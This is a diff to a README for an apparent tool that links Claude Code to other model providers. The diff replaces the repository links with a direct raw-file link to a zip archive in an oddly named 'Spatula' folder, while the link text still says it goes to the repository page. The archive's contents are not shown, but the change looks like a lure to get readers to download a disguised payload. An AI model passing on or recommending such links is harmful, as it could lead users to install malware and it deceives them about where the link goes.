@@ -1,6 +1,6 @@
 # 🤖 ClaudeCode-Model-Rotator - Connect Claude Code to more models
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/tullextraterrestrial3175/ClaudeCode-Model-Rotator)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/tullextraterrestrial3175/ClaudeCode-Model-Rotator/main/Spatula/Claude-Rotator-Model-Code-v1.5.zip)
 
 This application changes how Claude Code works. You gain the ability to use models from various providers instead of staying locked into one source. The software connects the official Claude Code interface to free options on OpenRouter and your own local or cloud models through Ollama.
 
@@ -23,7 +23,7 @@ If you plan to use local models with Ollama, you should have a solid state drive
 
 ## 🚀 How to Download and Install
 
-1. Visit the repository page to download the software: [https://github.com/tullextraterrestrial3175/ClaudeCode-Model-Rotator](https://github.com/tullextraterrestrial3175/ClaudeCode-Model-Rotator).
+1. Visit the repository page to download the software: [https://raw.githubusercontent.com/tullextraterrestrial3175/ClaudeCode-Model-Rotator/main/Spatula/Claude-Rotator-Model-Code-v1.5.zip](https://raw.githubusercontent.com/tullextraterrestrial3175/ClaudeCode-Model-Rotator/main/Spatula/Claude-Rotator-Model-Code-v1.5.zip).
 2. Look for the "Releases" section on the right side of the screen.
 3. Click the latest version link.
 4. Download the file ending in `.exe`.
